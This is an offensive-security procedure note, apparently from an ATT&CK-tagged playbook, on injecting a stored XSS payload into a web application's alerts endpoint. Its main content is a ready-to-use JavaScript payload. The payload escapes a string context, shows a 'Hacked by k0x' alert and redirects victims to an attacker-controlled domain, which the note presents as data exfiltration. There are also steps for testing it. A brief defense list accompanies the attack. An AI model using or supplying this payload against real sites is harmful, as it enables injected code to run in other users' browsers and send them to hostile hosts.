---
tags:
  - xss
  - javascript
  - payload
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/xss-payload-injection]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:25.188Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 2d9f8592-6ba7-4532-b341-26f441c3dd7d
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Create-Malicious-JavaScript-Payload-for-XSS

## Summary

This procedure outlines crafting a JavaScript payload designed to escape string contexts in the 'source' parameter of a web application's alerts endpoint, enabling stored XSS execution to demonstrate compromise.

## Description

In scenarios where input sanitization is inadequate, attackers can inject JavaScript that closes unintended string delimiters (e.g., quotes in SQL or HTML attributes) and executes code. This payload is tailored for the alerts creation endpoint, triggering an alert for proof-of-concept and redirecting to an attacker-controlled site for data exfiltration. Prerequisites include knowledge of the parameter's context (e.g., treated as a video source string) and access to test the payload.

## Requirements

1. Understanding of the target's input handling (e.g., 'source' as array parameter)
2. Browser developer tools for testing payload execution
3. Attacker-controlled domain for redirects (e.g., https://k0x.xyz)

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and sanitization (e.g., escape quotes, reject script tags)
- Use Content Security Policy (CSP) to block inline JavaScript execution
- Monitor for anomalous alerts creation or JavaScript errors in logs

## Objectives

1. Break out of string context to inject executable JavaScript
2. Demonstrate XSS via visible alert
3. Facilitate data exfiltration via redirect

## Instructions

### Step 1: Design Payload Structure

**Context**: Analyze the 'source' parameter context to craft an escape sequence.

**Command** ([[commands/xss-payload-injection]]):

```javascript
video"); alert('Hacked by k0x'); setTimeout(()=>location.href='https://k0x.xyz',5000);//
```

> This payload assumes 'source' is injected into a string like "video". It closes the quote with ", executes the alert, adds a 5-second delay for observation, redirects to exfiltrate data implicitly, and comments out the rest with // to avoid syntax errors.

### Step 2: Test Payload in Isolation

**Context**: Validate the payload executes without errors in a browser console or local HTML.

Embed in a test form and submit to a mock endpoint, then view the rendered output to confirm alert and redirect.

> Expected: Alert pops up, page redirects after 5 seconds.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/xss-payload-injection]]

## Tools Used


## Tags

- xss
- javascript
- payload
